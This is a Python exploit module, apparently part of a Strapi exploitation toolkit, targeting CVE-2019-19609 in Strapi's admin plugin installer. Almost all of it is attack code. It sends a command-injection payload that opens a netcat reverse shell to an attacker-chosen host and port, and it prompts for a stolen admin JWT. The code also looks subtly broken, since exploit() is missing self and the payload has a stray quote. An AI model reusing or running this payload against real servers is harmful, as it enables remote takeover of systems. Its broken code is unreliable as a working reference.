from strapi_exploit import StrapiExploitInterface
import requests

class CVE_2019_19609(StrapiExploitInterface):
    '''CVE-2019-19609 exploit for Strapi.'''
    def __init__(self):
        super().__init__("Strapi-CVE-2019-19609", "Remote Code Execution in the Install and Uninstall Plugin components of the Admin panel.")
    def check_if_vulnerable(self, version: str) -> bool:
        '''Check if the Strapi instance is vulnerable.'''
        if version.startswith('3.0.0-beta') or version.startswith('3.0.0-alpha'):
            return True
        return False
    def exploit(url: str, jwt: str, lhost: str, lport: str) -> bool:
        '''Exploit the vulnerability.'''
        headers = {
            "Host": url.replace('http://', '').replace('https://', ''),
            "Authorization": f"Bearer {jwt}",
            "Content-Type": "application/json",
            "Content-Length": "131",
            "Connection": "close"
        }
        payload = { 
            "plugin": f"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport}' >/tmp/f)", 
            "port": "80"
        }
        r = requests.post(f"{url}/admin/plugins/install", headers=headers, json=payload, timeout=10)
        if r.status_code == 200:
            return True
        return False
    def run(self) -> bool:
        url = self.input("Enter the URL of the Strapi instance")
        if url.endswith("/"):
            url = url[:-1]
        version = self.get_strapi_version(url)
        if not self.check_if_vulnerable(version):
            self.error("The Strapi instance is not vulnerable.")
            return True
        jwt = self.input("Enter the  Admin JWT token")
        lhost = self.input("Enter the LHOST")
        lport = self.input("Enter the LPORT")
        if self.exploit(url, jwt, lhost, lport):
            self.success("Exploit successful.")
            return True
        else:
            self.error("Exploit failed.")
            return False

def init() -> CVE_2019_19609:
    '''Initialize the exploit.'''
    return CVE_2019_19609()